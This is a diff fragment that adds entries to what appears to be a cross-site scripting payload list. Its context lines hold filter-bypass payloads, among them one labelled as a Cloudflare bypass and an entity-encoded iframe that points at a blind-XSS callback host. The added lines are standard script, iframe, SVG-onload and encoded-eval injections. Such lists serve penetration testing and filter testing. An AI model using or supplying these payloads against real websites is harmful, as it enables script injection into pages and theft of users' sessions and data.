@@ -13,4 +13,12 @@ javascript:var{a:onerror}={a:%2561lert};throw%20origin
 "><iframesrcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;#116;&#116;&#112;&#115;&#58;&#47;&#47;test.bxss.in&#34;&#59;&#117;&#109;&#101;&#110;&#116;&#46;&#62;">
 <Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
 1'"><img/src/onerror​=.1|alert``>
-
+"><script>alert`1`</script>
+"><script>top </script>
+"><iframe src="javascript:alert(1)">
+<iframe src="data:text/html,<script>alert(1)</script>">
+<ScRiPt>alert(1)</ScRiPt>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<svg onload=alert(1)>
+<svg%09onload=alert(1)>
+<svg onload=alert(1)>
